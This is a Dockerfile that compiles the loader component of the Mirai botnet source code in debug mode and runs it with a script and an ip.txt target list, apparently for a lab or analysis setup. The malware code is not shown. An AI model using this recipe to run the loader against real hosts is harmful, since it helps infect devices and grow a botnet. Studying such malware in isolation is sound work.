FROM debian:bullseye


RUN apt update && apt install -y gcc electric-fence
# eletric-fence can be used if we build the loader in debug mode - see below

WORKDIR /app


COPY ./Mirai-Source-Code/loader/ /app/loader_dir

# build loader binary
# see ./Mirai-Source-Code/loader/build.sh
# see ./Mirai-Source-Code/loader/build.debug.sh
RUN gcc -static -O3 -lpthread -pthread /app/loader_dir/src/*.c -o loader_app -DDEBUG

COPY ./ip.txt /app/ip.txt
COPY ./run_loader.sh /app/run_loader.sh


EXPOSE 80

CMD ["sh", "/app/run_loader.sh"]
